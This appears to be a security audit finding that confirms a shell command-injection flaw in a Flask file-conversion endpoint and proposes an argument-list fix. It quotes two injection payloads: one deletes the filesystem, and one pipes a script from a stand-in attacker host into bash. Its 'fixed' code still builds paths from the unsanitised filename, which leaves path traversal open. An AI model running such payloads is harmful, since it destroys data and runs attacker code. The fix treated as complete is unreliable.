## Verdict

CONFIRMED

The vulnerability exists at line 23 where untrusted user input (filename from `request.form`) is incorporated into an OS command via string concatenation and executed with `shell=True`, enabling attackers to inject arbitrary shell commands.

## Source

The attack surface is the `filename` parameter received via POST request form data at line 14:
```
filename = request.form["filename"]
```

This value flows unsanitized into the command string at lines 15 and 19-20, then reaches the taint sink at line 23:
```
subprocess.run(command, shell=True, check=True)
```

An attacker can craft a filename like `foo.docx; rm -rf /` or `foo.docx && curl attacker.com/steal.sh | bash` to execute arbitrary commands on the host.

## Fix

Replace the shell-concatenated command string with a subprocess argument list and `shell=False`:

```python
import subprocess

from flask import Flask, request, send_file

app = Flask(__name__)

UPLOAD_DIR = "/var/data/uploads"
OUTPUT_DIR = "/var/data/converted"


@app.route("/convert", methods=["POST"])
def convert_document():
    """Convert an uploaded document to PDF using the installed LibreOffice CLI."""
    filename = request.form["filename"]
    input_path = f"{UPLOAD_DIR}/{filename}"
    output_path = f"{OUTPUT_DIR}/{filename}.pdf"

    subprocess.run(
        ["libreoffice", "--headless", "--convert-to", "pdf", "--outdir", OUTPUT_DIR, input_path],
        shell=False,
        check=True
    )

    return send_file(output_path)


if __name__ == "__main__":
    app.run()
```

## Explanation

The root cause is passing user-controlled data into a shell command. The fix eliminates shell interpretation by:

1. **Converting to argument list form**: Instead of a single command string, pass arguments as list elements to `subprocess.run()`. The libreoffice executable receives each element as a separate argument without shell parsing.

2. **Setting `shell=False`**: This is the default, but made explicit here. The process is invoked directly without spawning an intermediate shell (`/bin/sh` or `cmd.exe`), eliminating the interpreter that would parse metacharacters like `;`, `&&`, `|`, and backticks.

3. **Preserving functionality**: The LibreOffice CLI receives the same arguments—the command still converts the file to PDF and outputs it to the specified directory. No functionality is lost.

With this change, if an attacker supplies `filename = "foo.docx; rm -rf /"`, libreoffice receives the literal string as a filename argument, not as a command with an embedded injection. The semicolon is data, not an instruction separator.

## Behaviour changes

- **Command execution model**: Changes from shell-interpreted string (`shell=True`) to direct process invocation (`shell=False`)
- **Argument handling**: User-supplied filename is now passed as a distinct argument element in an array, not interpolated into a command string
- **Safety**: Shell metacharacters in the filename no longer trigger command injection; they are treated as literal filename characters
- **Compatibility**: LibreOffice CLI behavior is unchanged—it receives the same arguments and produces the same PDF output
- **Performance**: Negligible improvement from eliminating shell spawning overhead
